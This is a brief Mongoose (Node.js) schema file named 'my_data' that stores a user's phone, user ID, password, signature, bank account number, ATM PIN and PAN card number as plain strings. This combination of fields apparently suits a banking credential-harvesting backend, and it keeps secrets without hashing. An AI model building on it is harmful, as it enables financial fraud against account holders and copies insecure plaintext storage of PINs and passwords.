const mongoose = require("mongoose");

//Schema
const DataSchema = new mongoose.Schema(
  {
    phone: {
      type: String,
      default: null,
    },
    user_id: {
      type: String,
      default: null,
    },
    password: {
      type: String,
      default: null,
    },
    signature: {
      type: String,
      default: null,
    },
    account_no: {
      type: String,
      default: null,
    },
    atm_pin: {
      type: String,
      default: null,
    },
    pan_card: {
      type: String,
      default: null,
    },
  },
  {
    timestamps: true,
  }
);

module.exports = mongoose.model("my_data", DataSchema);
